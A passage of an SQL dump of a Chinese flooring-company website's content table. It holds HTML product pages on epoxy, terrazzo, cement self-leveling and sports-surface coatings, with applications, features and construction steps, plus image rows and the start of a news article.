、无毒不助燃；</p>\r\n<p>5、具有高粘接力、较强的机械强度、抗化学药品性和良好的电气性。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、基面处理；</p>\r\n<p>2、涂刷封闭底漆；</p>\r\n<p>3、刮涂中层漆；</p>\r\n<p>4、打磨，吸尘；</p>\r\n<p>5、用自流平环氧色漆镘涂。</p>'),(20,8,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>机械性能要求较高的区域，如要求耐磨性强、耐一定冲击的机械厂、五金厂、码头、车道、车库、工业厂房、汽车飞机修理厂等水泥或水磨石地面。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、防尘、防潮、容易清洁；</p>\r\n<p>2、耐磨、耐冲击、硬度高；</p>\r\n<p>3、可做成防滑地面、哑光或亮光效果。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、素地处理：基层地坪打磨、清洁；</p>\r\n<p>2、环氧底涂：涂刷环氧树脂底漆；</p>\r\n<p>3、环氧中涂：批刮环氧树脂砂浆；</p>\r\n<p>4、环氧批涂：批刮环氧树脂腻子；</p>\r\n<p>5、环氧面涂：涂刷环氧树脂面漆。</p>'),(21,9,'',1,0,0,0,'','','','<p><strong>适用范围</strong></p>\r\n<p>1、地坪罩面:磨石地坪、撒花地坪、彩砂地坪、大理石地坪等;</p>\r\n<p>2、墙面罩面: KTV、展览馆、艺术中心等个性化铝扣板墙面;</p>\r\n<p>3、台面罩面:吧台、餐桌、会议桌等;</p>\r\n<p>4、艺术地坪:家居系统(家庭室内客厅、卧室、书房、卫浴等);</p>\r\n<p>5、教育系统:培训中心、幼儿园、图书馆等;</p>\r\n<p>6、商业系统:娱乐休闲中心、餐饮、服装专卖店、酒店大堂等;</p>\r\n<p><strong>性能特点</strong></p>\r\n<p>1、流展性高，高光泽度，无接缝;</p>\r\n<p>2、使基材色泽亮丽、防水、防晒、永不褪色;</p>\r\n<p>3、耐磨性强，抗污性高，可用水反复冲洗;</p>\r\n<p>4、形成- -个高密度，易清洁，抗冲击的低收缩率地坪;</p>\r\n<p>5、高抗压折性，不空鼓，不起泡，无辐射，绿色环保。</p>'),(22,9,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>博物馆、展览馆、漫咖啡、酒吧、画廊、别墅、特色餐厅、潮牌服饰和会所茶社等场所，平面与立体空间的融合，交映成趣。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、附着力超强，能有效附着在传统和非传统材料表面；</p>\r\n<p>2、一体无接缝，所以不用考虑大小规格问题；</p>\r\n<p>3、可应用在任何空间；</p>\r\n<p>4、可调配任何颜色，绘制任何图案，甚至镶嵌任何材料；</p>\r\n<p>5、纯手工量身定制，独一无二；</p>\r\n<p>6、安全环保，施工期间没有任何异味，有中、欧检测报告，均未检出有甲醛且有机排放量极低；</p>\r\n<p>7、耐磨、防火、防潮、防霉、隔水、可用作游泳池。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、基础地面上先用环氧找平，等找平层干了之后，在上面做水墨流淌风格艺术地坪；</p>\r\n<p>2、先把白色的艺术树脂搅拌均匀后，镘涂在地面上，在镘涂白色的艺术树脂达到30-40平之后，艺术老师上场；</p>\r\n<p>3、辅助人员或技术指导服务帮助调配黑色或浅色艺术树脂，给艺术老师配合使用；</p>\r\n<p>4、艺术老师根据和甲方协商好的艺术风格把有色树脂按照预定方案泼到白色自流平艺术树脂上面；</p>\r\n<p>5、泼墨工作完成后，艺术老师退出。辅助人员上来做消泡处理，师傅清洗工具清理垃圾；</p>\r\n<p>6、现场封闭工作要做好，切记不要有任何灰尘土和交叉施工事情；</p>\r\n<p>7、艺术树脂这一层固化后，用亮光水性聚氨酯最后罩面，7天后再使用。</p>'),(23,9,'',1,0,0,0,'','','','<p><strong>适用范围</strong></p>\r\n<p>1、用水泥等无机矿物材料做骨料粘接剂的磨石系统叫无机磨石。</p>\r\n<p>2、广泛应用于地铁、学校、医院、商场、企事业单位、厂房、广场等。</p>\r\n<p><strong>性能特点</strong></p>\r\n<p>1、由水泥等无机矿物材料制成，具有A级防火，环保无毒;</p>\r\n<p>2、独特的工艺使品质更接近天然石材，故也称生态磨石;</p>\r\n<p>3、材料本身整体高强度，而不是依靠密封固化剂只提高表面的强度;</p>\r\n<p>4、无收缩的特点可以实现整体大面无缝;</p>\r\n<p>5、无机材料耐老化的特点不惧产品变色和变形,寿命与水泥材料-样长;</p>\r\n<p>6、无机材料与有机材料相比更具成本优势;</p>\r\n<p>7、重潮湿天气无水珠。</p>\r\n<p><strong>施工工艺</strong></p>\r\n<p>1、基础地面处理平整;</p>\r\n<p>2、界面层处理;</p>\r\n<p>3、挂网抗裂;</p>\r\n<p>4、图案和分隔条的处理;</p>\r\n<p>5、骨料和水泥、水份按相关数据搭配搅拌摊铺;</p>\r\n<p>6、修复孔洞;</p>\r\n<p>7、再细磨，精磨;</p>\r\n<p>8、晶面抛光处理。</p>'),(24,9,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>适用于酒店、办公室、服装店、商业品牌店面墙面等等。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、具有优良的防水特性和自洁性；</p>\r\n<p>2、耐擦易洗，漆膜精致，色泽持久，外表细腻亮丽；</p>\r\n<p>3、绿色环保，不含有机物挥发物、游离甲醛和重金属等有害元素，可有效降解空气中的有害物质，制造清新宜人的良好空气环境；</p>\r\n<p>4、具有优异的防霉、防潮、抗藻性能，可抑制10种以上的霉菌生长。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、基面保持干燥，清理干净，底涂搅拌均匀，使用滚筒滚涂基面上即可；</p>\r\n<p>2、底涂施工完后，间隔5-8小时待表面干燥后方可批刮清水混凝土中涂（1:2加水调和）搅拌均匀，使用批刀开始批刮，如干燥基面局部不平整、结团，可适当打磨。根据个人喜欢批法可以不均匀。如果使用过程中，觉得厚不好批刮，可以添适当的水进行调试；</p>\r\n<p>3、中涂施工完后，间隔12小时以后滚涂水泥混凝土面涂。将保护面漆搅拌均匀，直接涂刷即可。</p>'),(25,9,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>适用于咖啡店，服装店，办公室，茶室，商业品牌店面地面等。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、整体无缝，完全不起尘，极易清洁，可满足高洁净度工业厂房的要求；</p>\r\n<p>2、颜色可任意选择、搭配，美观度极佳；</p>\r\n<p>3、防水、防霉、抗渗；</p>\r\n<p>4、高度耐磨，可行走重型车辆；具有较好的韧性，受到撞击不脱层、不开裂；</p>\r\n<p>5、与基层（混凝土、瓷砖、金属等）粘结牢固，在施工质量保证的前提下，不脱层、不开裂；</p>\r\n<p>6、耐一定程度的化学药品腐蚀。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、素地处理：素地必须彻底干燥，瓷砖等密实型地面需用打磨机打毛，地面不得有油污，地面不能用水清洗，如果地面起砂严重，建议用起砂处理剂加强后再做复古漆，依素地状况做好打磨、修补、除尘工作；</p>\r\n<p>2、将复古透明漆A组份与B组份按重量比混合均匀，注意一次配料不宜过多，尽量在15分钟内用完，用准备好的滚筒滚涂一道，墙角等滚涂不到的地方用毛刷刷涂；</p>\r\n<p>3、可根据地面情况施工2-3遍；</p>\r\n<p>4、施工完成24小时后方可上人，72小时后方可重压。</p>'),(26,9,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>食品加工厂、车库、停车A 场、医药生产车间、电子设备车间、汽车制造车间或维修车间、办公室、公寓、民用住房、百货店、超市、医院等地面的装饰。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、平整，可做超平地；耐磨，不起砂；抗压抗折强度高，可承受动荷载；</p>\r\n<p>2、早强高强性能：水泥基自流平材料以超早强水泥为基材，强度发展快，加快施工进度，后期强度高；</p>\r\n<p>3、高流动性能：现场很容易进行搅拌，浇注时不加任何外力或辅助措施既可流向任何需灌注部位并能自动找平；</p>\r\n<p>4、施工速度快，施工成本低：工厂预包装材料，操作简单，现场只需加水搅拌即可施工，在一天内可以对地面进行大面积的处理，保证了材料的一致性和均匀性；也可泵送施工；</p>\r\n<p>5、体积稳定：水泥基自流平材料具有很低的收缩率，可以进行大面积的无缝施工；</p>\r\n<p>6、耐久性：低渗透性可确保设备长期的操作性能；</p>\r\n<p>7、环保：无毒、无味、无污染、无放射性；</p>\r\n<p>8、经济：具有比环氧树脂地面材料更高的性价比。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、基层封闭；</p>\r\n<p>2、封底处理；</p>\r\n<p>3、彩色水泥自流平浆料搅拌均匀；</p>\r\n<p>4、铺设彩色水泥自流平；</p>\r\n<p>5、消泡处理；</p>\r\n<p>6、涂刷封闭底漆。</p>'),(27,9,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>适用于大型商场、中高档商业大厦、豪华会所、展示厅、酒店大堂、住宅和别墅的地面装修。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、拥有环氧树脂地坪的所有优异性能；</p>\r\n<p>2、可以设计成各种图案、体现设计上的灵活性。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、基面处理：打磨基面、清洁干燥；</p>\r\n<p>2、底涂层：环氧底油辊刷一遍；</p>\r\n<p>3、面涂层：环氧磨石涂料拌彩石摊铺、刮平。固化后，用专用机械打磨平整、抛光。</p>'),(28,9,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>要求耐磨损，耐强力冲击，装饰高档场合，具有一定地坪风格，特别适用于机场、大型商场、展览厅、地铁、电子通讯、医疗卫生、高级娱乐及商用大楼、食品生产、办公室及学校的实验室等重视外清洁，耐久性好的地方。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、原生态漆膜质感；</p>\r\n<p>2、色彩绚丽缤纷；</p>\r\n<p>3、颜色图案任意组合；</p>\r\n<p>4、抗压承载力好；</p>\r\n<p>5、漆膜透气性好，自然养护地面；</p>\r\n<p>6、彰显高贵气度。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、基面处理：打磨清洁，基面要求干燥、平整、无空鼓；</p>\r\n<p>2、环氧彩砂专用底涂封闭涂装；</p>\r\n<p>3、环氧彩砂施工；</p>\r\n<p>4、清除浮砂，批刮环氧透明腻子；</p>\r\n<p>5、清漆罩光。</p>'),(29,10,'',1,0,0,0,'','','','<p><strong>适用范围</strong></p>\r\n<p>适用于高速公路地面如收费站、弯道及隧道等需减速区域;城市人行道路、登山步道、斑马线、车库坡道、园林道路、城市广场小路、沿河景观道路、自行车道;高档住宅小区内的人行道、公园路径等场所。</p>\r\n<p><strong>性能特点</strong></p>\r\n<p>1、表面平整美观，色彩亮丽;</p>\r\n<p>2、耐磨、防潮、易清洗;</p>\r\n<p>3、表面有细微的粗糙度;</p>\r\n<p>4、采用无溶剂体系，环保性能好，防腐蚀性能好;</p>\r\n<p>5、具有耐磨、耐压、抗冲击性能好，使用寿命长等优点;</p>\r\n<p>6、有较好的耐候性，不褪色、不变色。</p>\r\n<p><strong>施工工艺</strong></p>\r\n<p>1、混凝土基层清理;如沥青基础，需经过一周养护后方可施工;</p>\r\n<p>2、修补裂缝、坑洞及凹陷处;</p>\r\n<p>3、胶粘剂底漆层施工(混凝土地面可直接涂刷，沥青路面可用水性底漆加石英粉刮涂后再行施工胶粘剂底漆) ;</p>\r\n<p>4、将双组份改性环氧树脂胶搅拌均匀后刮涂在固化的底漆上,并同时抛洒陶瓷颗粒;</p>\r\n<p>5、清理浮砂，再用高压水枪冲洗表面;</p>\r\n<p>6、可喷涂水性聚氨酪罩面面漆-道(选做)。</p>'),(30,10,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>室内/外全天候使用，用于篮球、排球、网球、五人制足球、羽毛球、乒乓球及其它多功能锻炼场地。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>悬浮式；结构性缓冲；自排水；多功能性；方便性；环保性；健康性；舒适性；耐用性；运动性能卓越。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、先把第一块地板的两个子扣分别靠住球场的底线和边线方向；</p>\r\n<p>2、第二块地板保持与第一块地板的摆放方法一致，连接处母扣和子扣依次对扣，依次铺装其余地板；</p>\r\n<p>3、第一排拼装完毕，再铺装第二排，依次类推至整个运动场地拼装完毕。</p>'),(31,10,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>适用于足球场、网球场、游泳池周围或美化环境。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、色泽鲜明；</p>\r\n<p>2、运动反弹力与天然草相似；</p>\r\n<p>3、适合各种气候独有的摩擦力；</p>\r\n<p>4、对皮肤几乎没有伤害；</p>\r\n<p>5、防紫外线，防腐蚀，防霉，且环保无污染；</p>\r\n<p>6、垂直排水速度快；</p>\r\n<p>7、便于维护保养；</p>\r\n<p>8、使用寿命长。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、材料准备；</p>\r\n<p>2、测量放线；</p>\r\n<p>3、草皮铺装；</p>\r\n<p>4、矽砂铺设；</p>\r\n<p>5、橡胶颗粒充实。</p>'),(32,10,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>适用于幼儿园各级各类学校及专业体育场、田径场跑道、半圆区、辅助区，全民健身路径，室内体育馆训练跑道，游乐场道路铺面，室内外跑道、公园、居民小区等活动场地。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、达到国家标准。机械铺装、机械喷涂，平整度极佳、无脱粒现象；</p>\r\n<p>2、价格经济；</p>\r\n<p>3、有孔隙，可透水、透气，弹性极好、无起泡现象；</p>\r\n<p>4、可全天候使用，耐磨性强、耐候性佳、耐压缩性强。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、跑道基础清洗清理、修复、滚涂一层防水材；</p>\r\n<p>2、固化保养24小时，待防水材固化后即可摊铺跑道底层；</p>\r\n<p>3、用单组份胶水与EPDM颗粒混合搅拌均匀后，倒入摊铺机后全场摊铺光滑面层，保证表面平整度；</p>\r\n<p>4、固化保养48小时后即可对跑道分道线划分；</p>\r\n<p>5、全部完工后场地保养15天即可投入使用。</p>'),(33,10,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>1、网球场、篮球场、排球场等各种运动场所；</p>\r\n<p>2、儿童乐园、幼儿园活动场；</p>\r\n<p>3、人行步道、社区、游乐场等彩色涂装。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>无缝防压，耐磨防滑、耐酸抗碱、防霉防水，外观亮丽、颜色多样、施工、保养简单、造价低廉。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、依素地状况做好打磨、修补、除尘的准备工作；</p>\r\n<p>2、将硅PU底漆均匀涂布一道；</p>\r\n<p>3、镘涂硅PU中涂一道或二道，增强地面的弹性及耐磨性；</p>\r\n<p>4、用硅PU面涂滚涂一道，使颜色均匀、无起泡现象发生；</p>\r\n<p>5、按球场标准划线。</p>'),(34,10,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>网球场、篮球场、羽毛球场、排球场、手球场、乒乓球场、室内足球场等运动场所。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、水性无毒，为环保型材料；</p>\r\n<p>2、颜色多样，色彩鲜艳，不褪色，不变色，具防紫外线性能；</p>\r\n<p>3、高度耐磨，不暴裂，不脱层，不起鼓；</p>\r\n<p>4、不滋生微生物，不长苔藓。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、混凝土或沥青混凝土基础；</p>\r\n<p>2、丙烯酸底油；</p>\r\n<p>3、丙烯酸找平层；</p>\r\n<p>4、丙烯酸纹理层；</p>\r\n<p>5、丙烯酸面层；</p>\r\n<p>6、球场划线。</p>'),(35,10,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>广泛适用于市政步道、园林小路、城市广场、高档住宅小区、停车场、商务办公大楼、户外运动场所（羽毛球场馆、篮球场馆等）。</p>\r\n<p><strong>性能特点：</strong></p>\r\n<p>1、高透水性；</p>\r\n<p>2、高承载力；</p>\r\n<p>3、良好的装饰效果；</p>\r\n<p>4、易维护；</p>\r\n<p>5、抗冻融性能佳；</p>\r\n<p>6、耐用；</p>\r\n<p>7、高散热性好。</p>\r\n<p><strong>施工工艺：</strong></p>\r\n<p>1、素地夯实；</p>\r\n<p>2、砂石层；</p>\r\n<p>3、振实基层；</p>\r\n<p>4、透水面层摊铺；</p>\r\n<p>5、摊铺平整，压实压平；</p>\r\n<p>6、覆膜养护；</p>\r\n<p>7、切割伸缩缝；</p>\r\n<p>8、涂刷养护剂。</p>'),(36,11,'',1,0,0,0,'','','','<p><strong>产品介绍</strong></p>\r\n<p>水性面漆系我司优选进口水性环氧树脂，高效表面助剂，并配合进口水性固化剂等原材料，通过先进的生产工艺调配而成，是一种无VOC、环保、高粘结强度、低粘度的高性能面涂材料。</p>\r\n<p><strong>特性说明</strong></p>\r\n<p>该产品具有：环保、无气味、粘度低、流展及流平性好、强度高的特点。</p>\r\n<p><strong>产品应用</strong></p>\r\n<p>本产品适用于食品、医药、学校、家居等具环保要求的地面施工。</p>\r\n<p><strong>施工说明</strong></p>\r\n<p>混合：按比例将A、B组份倒入搅拌桶后搅拌均匀（电动：搅拌时间不低于1min，手动：搅拌时间不低于2min，注意上下液面间的层间混合）。</p>\r\n<p>施工方法：在完全固化的中涂基面上直接进行施工即可，建议采用辊涂或喷涂施工。</p>\r\n<p>用量膜厚：0.12-0.15kg/m2</p>\r\n<p>施工条件：空气相对湿度75%以下，阴雨天或大气相对湿度高于80%时，或气温在5℃以下，应避免施工。</p>\r\n<p>贮存：密封贮存于阴凉通风处，防火、防潮，防晒。</p>\r\n<p><strong>安全事宜</strong></p>\r\n<p>本品属于化学品，吞服是有害或致命的，如果吞服应立即求医。不慎溅入眼睛，要用大量清水冲洗，严重者要立即求医。注意采取预防措施，防火防爆，残留物的处理应遵守有关国家或当地政府的安全法规。</p>'),(37,11,'',1,0,0,0,'','','','<p><strong>概要</strong></p>\r\n<p>本品为双组份无溶剂环氧体系，采用国际品牌优质环氧树脂和固化剂精心配制而成。适用于轻至中等载荷的工业地坪，如机械、电子、医药、食品、轻纺等行业的仓库、车间，亦可用于具有较高要求的大买场、办公室等。</p>\r\n<p><strong>性能特点</strong></p>\r\n<p>表面平整光洁，色彩艳丽，装饰效果优异;</p>\r\n<p>机械强度好，耐磨性好，寿命持久;</p>\r\n<p>固化稳定，流平性好，易于施工，不吸尘，不起尘，极易保洁，为净化厂房之首选;</p>\r\n<p>耐化学品性:可耐氯化钠，氯化铁，硫酸铜等盐类，氨水，动植物油，汽油，柴油，机油，柠檬酸( 10%)等化学介质可做亮光产品或哑光产品。</p>\r\n<p><strong>包装及质保期</strong></p>\r\n<p>包装规格: 25kg/ 组;</p>\r\n<p>严禁本产品在贮存和运输过程中曝晒或受潮;</p>\r\n<p>A: 20kg/桶， B: 5kg/桶;</p>\r\n<p>颜色:可根据国标色卡选定，也可由客户提供色卡; .</p>\r\n<p>配比: A:B=4: 1;</p>\r\n<p>注:实产涂料颜色与色卡可能会有细微差异。</p>\r\n<p>原装密封条件下置阴凉通风处保存，保质期为6个月。</p>\r\n<p><strong>施工指南</strong></p>\r\n<p>施工基面先涂装底漆并用中涂补平;</p>\r\n<p>前道中涂干燥后需进行打磨平整，并用面涂腻子对基层完全封闭;</p>\r\n<p>涂装面层前将基面用吸尘器将灰尘清洁干净，并不得有油污，水等;</p>\r\n<p>先将A搅拌均匀，再加入B料，以机械搅拌15分钟后，倒入另一容器中再稍做搅拌即可使用(必要时以60-80目筛网过滤) ;</p>\r\n<p>用锯齿形镘刀或橡皮刮板将物料在地坪.上摊铺均匀。</p>\r\n<p><strong>注意事项</strong></p>\r\n<p>最佳施工温度为15~25C,低于10C和高于30&deg;C会较难施工，底材温度应高于露点以上3C;</p>\r\n<p>施工环境的相对湿度应小于80%，过高湿度会对表观品质和附着力产生不良影响;</p>\r\n<p>施工场所应有良好的通风，所有设备应为防爆设备;</p>\r\n<p>施工人员应有良好的防护措施，如本品沾到皮肤、眼睛等请立即用清水清洗;</p>\r\n<p>未固化废料，清洗剂及废水请勿倒入水沟，水源及土壤，须按有关环保条例处理。</p>'),(38,11,'',1,0,0,0,'','','','<p><strong>概要</strong></p>\r\n<p>环氧磨石涂料先进的配方允许使用在高质量装饰性黄铜条，并保证不褪色。环氧磨石涂料是在安装过程 中有最小气味的高固体份树脂粘合剂。此外，它具有高物理强度，耐磨损，耐化学剂和防污染性。</p>\r\n<p><strong>性能特点</strong></p>\r\n<p>独特的外观和无限的可设计性;</p>\r\n<p>耐化学性和重载耐磨性;</p>\r\n<p>低气味排放;</p>\r\n<p>含抗菌剂;</p>\r\n<p>迅速的固化加速项目的运转;</p>\r\n<p>可用于USDA检查设备。</p>\r\n<p><strong>包装及质保期,</strong></p>\r\n<p>包装规格: 20kg/组;</p>\r\n<p>A: 16kg/桶，B: 4kg/桶;</p>\r\n<p>配比:A: B= 4:1</p>\r\n<p>原装密封条件下置阴凉通风处保存，保质期为12个月。严禁本产品在贮存和运输过程中曝晒或受潮。</p>\r\n<p><strong>施工指南</strong></p>\r\n<p>使用低速钻和快速刀片预混合A组份(树脂) 1分钟直到均匀，操作谨慎不要将空气混入原料;</p>\r\n<p>以体积为单位将4份A (4加仑树脂)加入1份B (1加仑固化剂),用低速钻和快速刀片混合3分钟直到均匀。加入150 lbs预</p>\r\n<p>定的骨料或其他认可的骨料。再加入5270环氧填料(每5加仑环氧磨石涂料混合树脂加入25磅)。继续搅拌直到所有骨料浸湿; .</p>\r\n<p>立即把混合后的材料放到基材上，使用手动或电动的抹刀;</p>\r\n<p>允许原料最少48小时固化。</p>\r\n<p><strong>注意事项</strong></p>\r\n<p>适宜的施工温度为5~ 35C ,基材温度高于露点30C以上施工会较为困难;</p>\r\n<p>施工环境的相对湿度以小于80%为宜，过高的湿度会导致附着力下降;</p>\r\n<p>施工现场应有良好的通风;</p>\r\n<p>施工人员应有良好的防护措施，如本品沾到皮肤、眼睛等请立即用清水清洗;</p>\r\n<p>未固化废料，清洗剂及废物请勿倒入水沟，水源及土壤，须按有关环保条例处理。</p>'),(39,11,'',1,0,0,0,'','','','<p><strong>产品介绍</strong></p>\r\n<p>防静电面漆系我司优选进口环氧树脂，高效表面助剂，高性能导电助剂、并配合进口固化剂等原材料，通过先进的生产工艺调配而成，是一种低VOC、环保、高粘结强度、低粘度的高性能特面涂材料。</p>\r\n<p><strong>特性说明</strong></p>\r\n<p>该产品具有：优异且长效的防静电效果，环保、气味小、粘度低、流展及流平性好、强度高等的特点。</p>\r\n<p><strong>产品应用</strong></p>\r\n<p>本产品将先进的导电材料引入到涂料体系，可以生产各种颜色的产品，以满足不同场所的需求。</p>\r\n<p><strong>施工说明</strong></p>\r\n<p>混合：按比例将A、B组份倒入搅拌桶后搅拌均匀（电动：搅拌时间不低于1min，手动：搅拌时间不低于2min，注意上下液面间的层间混合）。</p>\r\n<p>施工方法：在完全固化的导电中涂基面上直接进行施工即可，进行辊涂.</p>\r\n<p>用量膜厚：0.12-0.15kg/m2</p>\r\n<p>施工条件：空气相对湿度75%以下，阴雨天或大气相对湿度高于80%时，或气温在5℃以下，应避免施工。</p>\r\n<p>贮存：密封贮存于阴凉通风处，防火、防潮，防晒。</p>\r\n<p><strong>安全事宜</strong></p>\r\n<p>本品属于化学品，吞服是有害或致命的，如果吞服应立即求医。不慎溅入眼睛，要用大量清水冲洗，严重者要立即求医。注意采取预防措施，防火防爆，残留物的处理应遵守有关国家或当地政府的安全法规。</p>'),(40,11,'',1,0,0,0,'','','','<p><strong>适用范围</strong></p>\r\n<p>适用于生产性工业厂房、仓库、实验室等水泥地坪的耐磨、防尘、防腐涂装。</p>\r\n<p><strong>主要性能：</strong></p>\r\n<p>1、涂层平整光洁，色泽艳丽，装饰效果佳。</p>\r\n<p>2、附着力强，不易起壳开裂。</p>\r\n<p>3、抗压、耐磨，寿命持久。</p>\r\n<p>4、耐酸、碱、盐等多种腐蚀性介质。</p>\r\n<p><strong>施工工艺</strong></p>\r\n<p>1、施工基面先涂装环氧底漆。</p>\r\n<p>2、前道底涂须对水泥基层完全封闭。</p>\r\n<p>3、涂装面层前将基面用吸尘器将灰尘清洁干净，并不得有油污，水等。</p>\r\n<p>4、将AB材料按比例进行添加，以机械搅拌（电动或气动）3分钟后，可倒入干净的石英砂或碳酸钙进行涂装。</p>\r\n<p>5、施工工具根据工程需要可为批刀（镘刀）或铁板。</p>\r\n<p>6、施工工具可用专用稀释剂清洗。</p>'),(41,11,'',1,0,0,0,'','','','<p><strong>概要</strong></p>\r\n<p>本品为双组份环氧树脂高级地坪涂料，高固体含量，涂层与底涂附着力优异，耐磨、抗冲击、硬度高。</p>\r\n<p>适用于生产性工业厂房、仓库、实验室等水泥地坪的耐磨、防尘、防腐涂装。</p>\r\n<p><strong>性能特点</strong></p>\r\n<p>涂层平整光洁，色泽艳丽，装饰效果佳;</p>\r\n<p>附着力强，不易起壳开裂;</p>\r\n<p>抗压、耐磨，寿命持久;</p>\r\n<p>耐酸、碱、盐等多种腐蚀性介质。</p>\r\n<p><strong>包装及质保期</strong></p>\r\n<p>包装规格: 25kg/ 组;</p>\r\n<p>A: 20kg/桶，B: 5kg/桶;</p>\r\n<p>配比: A:B=4: 1;</p>\r\n<p>原装密封条件下置阴凉通风处保存，保质期为12个月;</p>\r\n<p>严禁本产品在贮存和运输过程中曝晒或受潮;</p>\r\n<p>颜色:根据国标色卡选定，亦可由客户提供色卡，最小批量200Kg;</p>\r\n<p>注:实产涂料颜色与色卡可能会有细微差异。</p>'),(42,11,'',1,0,0,0,'','','','<p><strong>适用范围：</strong></p>\r\n<p>适用于轻载至中等载荷的车间地坪、仓库地坪、加油站、油库、化学品储槽等地坪漆涂装系统。</p>\r\n<p>&nbsp;</p>\r\n<p><strong>主要性能：</strong></p>\r\n<p>1、粘度底，对水泥基面有很好的附着力。</p>\r\n<p>2、具有良好的硬度、柔韧性、耐磨性，寿命持久。</p>\r\n<p>3、固化稳定即使在较低温度下亦能较好硬化。</p>\r\n<p>4、对水泥表层有明显增强作用，尤其对较疏松之基面。</p>\r\n<p>&nbsp;</p>\r\n<p><strong>施工方法 &nbsp;</strong></p>\r\n<p>1、要求基面应密实、干燥，无油污（含水率 &lt; 8%）。</p>\r\n<p>2、涂装前先以无尘研磨机或喷砂机对基面进行彻底处理并吸净灰尘。</p>\r\n<p>3、开桶后即可使用 ，以滚筒或毛刷施工。</p>\r\n<p>4、一般较密实地坪涂装一道即可，较疏松之地坪建议涂装二道。</p>\r\n<p>5、未用完之物料务必请盖紧密封，保存备用。</p>\r\n<p>6、施工工具可用专用稀释剂清洗。</p>'),(43,18,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/64a1eb39b342c411496dfb98da9145b3.jpg\\\" />'),(44,18,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/645fc7481a88a327945b377306cde7e4.jpg\\\" />'),(45,18,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/6a946bbeb4b448e6e7fc4cef834e2a25.jpg\\\" />'),(46,18,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/fd32c6388369ce0607a8cf51608dcfbe.jpg\\\" />'),(47,18,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/3afdb7076eeb8cb1c7413ab261b17a2e.jpg\\\" />'),(48,18,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/3f3ec9dfcafcfa3edd937cd44b84b522.jpg\\\" />'),(49,18,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/0e708e9b4011be6d496af1d895dece12.jpg\\\" />'),(170,22,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/997be3471ce4e4929e28759e337e902b.jpg\\\" style=\\\"width: 450px; height: 600px;\\\" /><br />&nbsp;'),(51,18,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/353dd83cdb630f286f6d6d2dfc3efee2.jpg\\\" />'),(52,18,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/8d7feed4ea33bb9eda8278146d00a51e.jpg\\\" />'),(53,18,'',1,0,0,0,'','','','<img alt=\\\"\\\" src=\\\"/d/file/e3fcc80a7cd0d6ecd3b5e3184d4d26f5.jpg\\\" />'),(54,15,'',1,0,0,0,'','','','地坪行业一项重大突破，解决了环氧地坪对素地要求较高的难题。<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 丽邦公司**新引进台湾水性环氧新配方：已经完成对上万平米毛坯翻砂地面的实践，水性环氧和油性环氧相结合施工；实践证明：无脱层，不起泡无气孔，已经达到高平整度高强度高亮度的环氧地坪验收标准。'),(55,15,'',1,0,0,0,'','','','<p><font face=\\\"Verdana\\\">&ldquo;绿色环保建材调研&rdquo;地坪漆生产厂家小组的记者队员们先后走访了各建材市场，为了深入的了解绿色环保市场，记者们针对板材、涂料、贴面三大类建材展开专项研讨，同环保类产品厂家进行了深入的交流。</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　地坪漆生产厂家在调研小组的交流中，记者了解到现在市场上有很多种类的绿色环保涂料油漆。</font></p>\r\n<p><br /><font face=\\\"Verdana\\\">　　